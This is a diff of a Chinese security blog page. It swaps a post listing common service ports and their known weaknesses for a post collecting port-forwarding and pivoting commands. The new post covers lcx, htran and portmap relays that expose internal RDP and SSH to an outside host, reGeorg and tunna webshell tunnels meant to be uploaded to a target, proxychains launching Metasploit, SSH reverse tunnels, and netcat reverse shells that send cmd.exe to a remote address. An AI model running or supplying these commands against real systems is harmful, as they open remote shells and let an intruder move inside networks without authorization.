@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>渗透测试中常见的端口 · admincccc&#39;s Blog</title>
+    <title>端口转发集合 · admincccc&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >admincccc&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">渗透测试中常见的端口</a>
+                <a href="#" class="post-name">端口转发集合</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            渗透测试中常见的端口
+            端口转发集合
             <!-- 404 -->
             
         </h1>
@@ -261,7 +261,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">655</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">960</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -390,20 +390,26 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>在渗透中一些常见的的服务端口.</p>
-<h3 id="1、web类-web漏洞-敏感目录"><a href="#1、web类-web漏洞-敏感目录" class="headerlink" title="1、web类(web漏洞/敏感目录)"></a>1、web类(web漏洞/敏感目录)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第三方通用组件漏洞struts thinkphp jboss ganglia zabbix </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br></pre></td></tr></table></figure>
-<h3 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">6379 Redis</span><br></pre></td></tr></table></figure>
-<h3 id="3、特殊服务类-未授权-命令执行类-漏洞"><a href="#3、特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3、特殊服务类(未授权/命令执行类/漏洞)"></a>3、特殊服务类(未授权/命令执行类/漏洞)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
-<h3 id="4、常用端口类-扫描弱口令-端口爆破"><a href="#4、常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令/端口爆破)"></a>4、常用端口类(扫描弱口令/端口爆破)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3389 远程桌面</span><br></pre></td></tr></table></figure>
-<h3 id="5、端口合计详情"><a href="#5、端口合计详情" class="headerlink" title="5、端口合计详情"></a>5、端口合计详情</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat/WDCP主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
-
+        <p>一些常用的端口转发集合</p>
+<h3 id="1-Linux-portmap"><a href="#1-Linux-portmap" class="headerlink" title="1. Linux  portmap"></a>1. Linux  portmap</h3><pre><code>转发ssh到外网 不太常用
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    <span class="comment">#先在外网执行</span></span><br><span class="line">./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  <span class="comment">#在内网shell下执行</span></span><br><span class="line">ssh 127.0.0.1 -p 7777   <span class="comment">#在外网机器上执行</span></span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="2-Windows-lcx"><a href="#2-Windows-lcx" class="headerlink" title="2. Windows lcx"></a>2. Windows lcx</h3><pre><code>转发3389到外网
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 1234 2333   #本地 监听1234端口,转发数据到2333端口</span><br><span class="line">lcx.exe -slave ip 1234 127.0.0.1 3389   #远程 将目标的3389转发到本地的1234端口</span><br><span class="line">mstsc.exe 127.0.0.1:2333</span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="3-reGeorg-proxychains-or-Proxifier-比较稳定首选"><a href="#3-reGeorg-proxychains-or-Proxifier-比较稳定首选" class="headerlink" title="3. reGeorg + proxychains or Proxifier  比较稳定首选"></a>3. reGeorg + proxychains or Proxifier  比较稳定首选</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://webshell.com/tunnel.jsp -p 1088  #将tunnel.jsp上传到目标服务器并在本地执行</span><br><span class="line">Linux下配置</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks5 	127.0.0.1 1088  #proxychains</span><br><span class="line">proxychains metsploit   #代理启动metsploit</span><br><span class="line">Windows下配置</span><br><span class="line">安装proxifier 进行相关配置即可</span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="4-rtcp-py"><a href="#4-rtcp-py" class="headerlink" title="4. rtcp.py"></a>4. rtcp.py</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 在B服务器上运行：</span><br><span class="line">./rtcp.py l:10001 l:10002</span><br><span class="line">表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了</span><br><span class="line">2. 在A服务器上运行：</span><br><span class="line">./rtcp.py c:localhost:22 c:222.2.2.2:10001</span><br><span class="line">表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了</span><br><span class="line">3. 然后我们就可以这样来访问A服务器的22端口了：</span><br><span class="line">ssh 222.2.2.2 -p 10002</span><br><span class="line">如果报错ssh_exchange_identification: read: Connection reset by peer  解决方法chmod 400 /etc/ssh/*</span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="5-tunna"><a href="#5-tunna" class="headerlink" title="5. tunna"></a>5. tunna</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一步 运行proxy.py 并指定端口 python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v</span><br><span class="line">第二步 本地执行  rdesktop 127.0.0.1:1234</span><br><span class="line">python2.7 proxy.py -u http://x.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389   #-a指定内网的机器</span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="6-htran"><a href="#6-htran" class="headerlink" title="6. htran"></a>6. htran</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">正向代理</span><br><span class="line">服务端      htran.exe -s -bind 8888</span><br><span class="line">客户端      SocksCap:SOCKS Version 5 服务端IP:8888</span><br><span class="line"> </span><br><span class="line">反向代理</span><br><span class="line">客户端      htran.exe -s -listen 1234 8888</span><br><span class="line">服务端      htran.exe -s -connect 客户端IP 1234</span><br><span class="line">客户端      SocksCap:SOCKS Version 5 127.0.0.1:8888</span><br><span class="line"> </span><br><span class="line">正向端口转发</span><br><span class="line">服务端      htran.exe -p -tran 8888 127.0.0.1 3389</span><br><span class="line">客户端      RDP 服务端IP:8888</span><br><span class="line"> </span><br><span class="line">反向端口转发</span><br><span class="line">客户端      htran.exe -p -listen 1234 8888</span><br><span class="line">服务端      htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389</span><br><span class="line">客户端      RDP 127.0.0.1:8888</span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="7-iptables端口映射"><a href="#7-iptables端口映射" class="headerlink" title="7. iptables端口映射"></a>7. iptables端口映射</h3><pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf <span class="comment">#将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1 开启转发功能</span></span><br><span class="line">sysctl -p   <span class="comment">#使数据转发功能生效</span></span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.46.129 -p tcp --dport 81 -j DNAT --to-destination 172.24.20.25:80 <span class="comment">#把本地192.168.46.129的81端口转为目标172,24.20.25的80端口</span></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 172.24.20.25 -p tcp --dport 80  -j SNAT --to-source 192.168.46.129   <span class="comment">#172.24.20.25:80返回时 将ip修改为192.168.46.129</span></span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="8-SSH隧道-root权限"><a href="#8-SSH隧道-root权限" class="headerlink" title="8. SSH隧道  root权限"></a>8. SSH隧道  root权限</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -L 82:8.8.8.8:80 -l root 8.8.8.8   #正向隧道 监听本地port 访问http://127.0.0.1:82</span><br><span class="line">ssh -qTfnN -R 82:8.8.8.8:80 -l root 8.8.8.8   #反向隧道 用于内网穿透防火墙限制之类</span><br><span class="line">ssh -qTfnN -D 1088 8.8.8.8    #socks全局代理 修改proxychains.conf 为127.0.0.1:1088即可</span><br><span class="line">SSH -qTfnN -D port remotehost</span><br><span class="line">-q Quiet mode. #安静模式</span><br><span class="line">-T Disable pseudo-tty allocation. #不占用 shell 了</span><br><span class="line">-f Requests ssh to go to background just before command execution. #后台运行，并推荐加上 -n 参数</span><br><span class="line">-N Do not execute a remote command. #不执行远程命令，端口转发就用它了</span><br></pre></td></tr></table></figure>
+</code></pre><h3 id="9-nc反弹shell"><a href="#9-nc反弹shell" class="headerlink" title="9. nc反弹shell"></a>9. nc反弹shell</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vv 8.8.8.8 8080 -e c:\cmd.exe //链接到远程 不输入-e选项即时聊天</span><br><span class="line">nc -lvvp 8080   //反弹</span><br><span class="line">nc -nv 192.168.64.1 8080 -e C:\Windows\System32\cmd.exe</span><br><span class="line">nc -lvp 8080</span><br></pre></td></tr></table></figure>
+</code></pre>
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://github.com/admincccc/admincccc.github.io/tree/master">admincccc</a>
-            <p>原文链接: <a href="https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/渗透测试中常见的端口/">https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/渗透测试中常见的端口/</a>
-            <p>发表日期: <a href="https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/渗透测试中常见的端口/">July 13th 2018, 2:41:24 pm</a>
+            <p>原文链接: <a href="https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/端口转发集合/">https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/端口转发集合/</a>
+            <p>发表日期: <a href="https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/端口转发集合/">July 13th 2018, 3:30:42 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -411,17 +417,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/13/端口转发集合/" title= 端口转发集合 >
-                    <div class="nextTitle">端口转发集合</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/12/linux反弹shell的方式收集/" title= linux反弹shell的方式收集 >
-                    <div class="prevTitle">linux反弹shell的方式收集</div>
+                <a href= "/2018/07/13/渗透测试中常见的端口/" title= 渗透测试中常见的端口 >
+                    <div class="prevTitle">渗透测试中常见的端口</div>
                 </a>
             
         </li>
@@ -438,8 +439,8 @@ height:50vh;
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
         
         var disqus_config = function () {
-        this.page.url = "https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/渗透测试中常见的端口/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "渗透测试中常见的端口"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = "https://github.com/admincccc/admincccc.github.io/tree/master/2018/07/13/端口转发集合/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "端口转发集合"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
         };
         
         (function () { // DON'T EDIT BELOW THIS LINE
@@ -545,7 +546,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、web类-web漏洞-敏感目录"><span class="toc-number">1.</span> <span class="toc-text">1、web类(web漏洞/敏感目录)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、数据库类-扫描弱口令"><span class="toc-number">2.</span> <span class="toc-text">2、数据库类(扫描弱口令)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、特殊服务类-未授权-命令执行类-漏洞"><span class="toc-number">3.</span> <span class="toc-text">3、特殊服务类(未授权/命令执行类/漏洞)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、常用端口类-扫描弱口令-端口爆破"><span class="toc-number">4.</span> <span class="toc-text">4、常用端口类(扫描弱口令/端口爆破)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、端口合计详情"><span class="toc-number">5.</span> <span class="toc-text">5、端口合计详情</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Linux-portmap"><span class="toc-number">1.</span> <span class="toc-text">1. Linux  portmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Windows-lcx"><span class="toc-number">2.</span> <span class="toc-text">2. Windows lcx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-reGeorg-proxychains-or-Proxifier-比较稳定首选"><span class="toc-number">3.</span> <span class="toc-text">3. reGeorg + proxychains or Proxifier  比较稳定首选</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-rtcp-py"><span class="toc-number">4.</span> <span class="toc-text">4. rtcp.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-tunna"><span class="toc-number">5.</span> <span class="toc-text">5. tunna</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-htran"><span class="toc-number">6.</span> <span class="toc-text">6. htran</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-iptables端口映射"><span class="toc-number">7.</span> <span class="toc-text">7. iptables端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-SSH隧道-root权限"><span class="toc-number">8.</span> <span class="toc-text">8. SSH隧道  root权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-nc反弹shell"><span class="toc-number">9.</span> <span class="toc-text">9. nc反弹shell</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
